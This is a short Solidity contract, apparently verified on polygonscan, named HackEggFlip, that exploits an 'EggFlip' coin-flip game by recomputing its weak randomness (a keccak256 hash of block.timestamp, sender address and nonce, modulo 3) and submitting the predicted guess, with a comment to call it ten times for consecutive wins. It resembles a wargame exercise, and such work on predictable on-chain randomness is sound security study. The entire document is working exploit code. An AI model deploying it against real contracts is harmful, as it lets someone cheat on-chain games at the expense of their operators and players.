/**
 *Submitted for verification at polygonscan.com on 2023-04-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEggFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(uint) external returns (bool);
}

contract HackEggFlip {
    IEggFlip private immutable target;
    
    constructor(address _target) {
        target = IEggFlip(_target);
    }

    // call this function 10 times
    function flip(uint nonce,  address sender_address) external {
        uint guess = _guess(nonce, sender_address);
        require(target.flip(guess), "guess failed");
    }

    function _guess(uint nonce, address sender_address) private view returns (uint) {
        uint hacked_random =uint(keccak256(abi.encodePacked(block.timestamp, sender_address, nonce))) % 3;
        return hacked_random;
    }
}